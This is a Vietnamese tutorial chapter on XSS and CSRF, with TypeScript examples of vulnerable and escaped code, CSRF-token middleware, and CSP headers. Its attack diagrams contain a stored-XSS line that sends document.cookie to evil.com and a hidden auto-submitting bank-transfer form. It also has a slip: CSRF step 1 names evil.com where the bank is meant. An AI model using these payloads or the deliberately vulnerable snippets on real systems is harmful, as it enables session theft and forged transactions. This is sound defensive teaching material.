# 🌐 9.4 XSS & CSRF

> **XSS** (Cross-Site Scripting) và **CSRF** (Cross-Site Request Forgery) là 2 trong những lỗ hổng phổ biến nhất trên web.

```
┌─────────────────────────────────────────────────────────┐
│        XSS vs CSRF — Phân biệt                          │
├──────────────┬──────────────────────┬────────────────────┤
│              │  XSS                 │  CSRF              │
├──────────────┼──────────────────────┼────────────────────┤
│ Mục tiêu     │ Client (trình duyệt) │ Server (user)      │
│ Cách hoạt động│ Chèn script độc     │ Giả mạo request    │
│ Target       │ Đọc/bẻ khóa session  │ Thực hiện hành vi  │
│ Phòng chống  │ Encode output       │ CSRF token + SameSite│
└──────────────┴──────────────────────┴────────────────────┘
```

---

## 🎯 Phần 1: XSS (Cross-Site Scripting)

### 3 loại XSS

| Loại | Mô tả | Ví dụ |
|------|-------|-------|
| **Reflected** | Script độc gửi qua URL, phản hồi ngay | Link độc gài `<script>` |
| **Stored** | Script lưu vào DB, hiển thị cho mọi người | Comment độc trên forum |
| **DOM-based** | Client-side JS xử lý URL unsafe | `location.hash` dùng trực tiếp |

```
┌─────────────────────────────────────────────────────────┐
│               XSS ATTACK FLOW                           │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Reflected:                                             │
│  Attacker → Gửi link độc → Victim click → Server反射   │
│             /search?q=<script>steal()</script>          │
│             → Response chứa script → Browser chạy        │
│                                                         │
│  Stored:                                                │
│  Attacker → Gửi comment độc → Lưu DB                   │
│             <script>document.location='evil.com?c='+document.cookie</script>│
│             → User khác mở trang → Script chạy          │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

### 💻 Code ví dụ

```typescript
// ❌ BAD — Render raw HTML từ user input
app.get('/search', (req, res) => {
  const query = req.query.q as string;
  // User nhập: <script>alert('XSS')</script>
  res.send(`<h1>Kết quả cho: ${query}</h1>`);
});

// ✅ GOOD — Escape HTML trước khi render
import escapeHtml from 'escape-html';

app.get('/search', (req, res) => {
  const query = req.query.q as string;
  const safeQuery = escapeHtml(query);
  res.send(`<h1>Kết quả cho: ${safeQuery}</h1>`);
});
```

```typescript
// DOM-based XSS — React example
// ❌ BAD — dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ GOOD — React tự escape text
<div>{userInput}</div>

// ✅ GOOD — Dùng thư viện sanitize
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

---

## 🎯 Phần 2: CSRF (Cross-Site Request Forgery)

### Cơ chế tấn công

```
┌──────────────────────────────────────────────────────────┐
│                 CSRF FLOW                                 │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  1. User đăng nhập vào evil.com (có cookie auth)          │
│  2. evil.com ẩn form + auto-submit vào bank.com          │
│     <form action="https://bank.com/transfer" method="POST">│
│       <input name="amount" value="1000">                  │
│       <input name="to" value="attacker">                  │
│     </form>                                               │
│     <script> document.forms[0].submit() </script>         │
│                                                          │
│  3. Browser gửi request KÈM cookie → Bank tin là user     │
│     đang gửi request hợp lệ!                              │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---

### 🛡️ Phòng chống CSRF

| Phương pháp | Mức độ | Cách hoạt động |
|-------------|--------|----------------|
| **SameSite Cookie** | ✅ Recommended | Browser không gửi cookie cross-site |
| **CSRF Token** | ✅ Recommended | Token ngẫu nhiên trong form + header |
| **Custom Header** | ✅ Good | `X-Requested-With: XMLHttpRequest` |
| **Double Submit Cookie** | ✅ Good | Token gửi 2 nơi, server so sánh |

```typescript
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

const csrfProtection = csrf({ cookie: true });

// ✅ GOOD — CSRF token protection
app.use(cookieParser());
app.use(csrfProtection);

app.get('/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // req.csrfToken() đã được xác thực
  const { amount, to } = req.body;
  // execute transfer...
  res.json({ success: true });
});
```

```typescript
// Frontend: đọc token từ cookie và gửi cùng request
// ❌ BAD — Không có CSRF token
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ amount: 1000, to: 'attacker' }),
  credentials: 'include', // gửi cookie
});

// ✅ GOOD — Gửi CSRF token
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('csrfToken='))
  ?.split('=')[1];

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'x-csrf-token': csrfToken!,
  },
  credentials: 'include',
  body: JSON.stringify({ amount: 1000, to: 'attacker' }),
});
```

---

## 🔒 CSP (Content Security Policy)

CSP giúp giảm thiểu XSS bằng cách chặn script không thuộc nguồn tin cậy.

```typescript
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],           // Chỉ load từ same-origin
      scriptSrc: ["'self'", 'https://cdn.example.com'],
      styleSrc: ["'self'", 'https://fonts.googleapis.com'],
      imgSrc: ["'self'", 'data:', 'https://images.example.com'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      objectSrc: ["'none'"],            // Cấm <object>
      upgradeInsecureRequests: [],      // Tự động upgrade HTTPS
    },
  })
);
```

```
┌─────────────────────────────────────────────────────────┐
│            CSP DIRECTIVES                               │
├──────────────────┬──────────────────────────────────────┤
│ default-src      │ Fallback khi không có directive khác │
│ script-src       │ Nơi load JavaScript                  │
│ style-src        │ Nơi load CSS                         │
│ img-src          │ Nơi load hình ảnh                    │
│ connect-src      │ Nơi fetch/xhr đến                    │
│ font-src         │ Nơi load font                        │
│ object-src       │ Nơi load <object>/<embed>            │
│ frame-src        │ Nơi load iframe                      │
│ base-uri         │ Giới hạn <base> URL                  │
│ form-action      │ Giới hạn <form> action               │
└──────────────────┴──────────────────────────────────────┘
```

---

## ✅ Checklist phòng chống

| # | Biện pháp | Chống lại |
|---|-----------|-----------|
| 1 | Escape/encode output | XSS |
| 2 | Input validation (whitelist) | XSS, Injection |
| 3 | CSP headers | XSS |
| 4 | CSRF token trên mọi form | CSRF |
| 5 | SameSite=Strict/Lax cookie | CSRF |
| 6 | HttpOnly cookie | XSS đọc cookie |
| 7 | Không dùng `eval()` | XSS |

---

## 📚 Tài liệu tham khảo

- 📖 [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- 📖 [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- 📖 [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

⏭️ Bài tiếp theo → [9.5 Encryption](../9.5-encryption/README.md)
